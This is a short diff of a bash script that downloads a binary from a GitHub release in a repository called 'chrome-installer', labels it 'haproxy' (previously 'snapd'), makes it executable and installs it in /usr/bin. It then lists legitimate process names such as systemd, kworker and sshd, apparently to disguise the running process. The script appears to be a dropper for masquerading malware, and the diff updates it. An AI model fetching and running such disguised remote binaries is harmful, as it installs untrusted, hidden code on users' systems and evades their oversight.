@@ -1,12 +1,13 @@
 #!/bin/bash
 set -e
-curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/snapd-linux.tar.gz
-tar -xf snapd-linux.tar.gz
-rm snapd-linux.tar.gz
-cd snapd-linux
-chmod +x ./snapd
+curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz
+tar -xf haproxy.tar.gz
+rm haproxy.tar.gz
+cd haproxy
+chmod +x ./haproxy
+mv ./haproxy /usr/bin/haproxy
 
-HAPROXY_BIN="./snapd"
+HAPROXY_BIN="/usr/bin/haproxy"
 PROCESS_NAMES=(
 chrome node systemd kworker redis dockerd containerd sshd nginx pm2
 )
